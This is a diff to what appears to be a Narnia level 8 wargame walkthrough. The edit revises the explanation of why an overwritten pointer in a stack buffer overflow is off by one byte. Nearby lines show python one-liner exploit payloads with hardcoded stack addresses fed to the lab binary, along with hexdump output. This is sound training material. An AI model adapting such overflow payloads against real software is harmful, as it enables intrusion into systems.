@@ -402,7 +402,8 @@ narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A" * 20 + "\x71\xd8\xff\xf
 0000000 4141 4141 4141 4141 4141 4141 4141 4141
 0000010 4141 4141 7171[1] ffff 0a02 
 ```
-That's interesting. We now have 0xffff7171, which means our address is one off. Moving up one more byte should give us the correct address.
+That's interesting. We now have 0xffff7171. The first 0x71 gets placed onto the last byte of `blah` due to our buffer. `blok[21]` now ends up pointing to `\x71` in our buffer when it needs to point to `\xd8`, the next byte over.  
+So  moving up one more byte should give us the correct address.
 ```
 narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A" * 20 + "\x72\xd8\xff\xff" + "B"*12 +"\x94\xd8\xff\xff"')          
 AAAAAAAAAAAAAAAAAAAAr���BBBBBBBBBBBB����r���
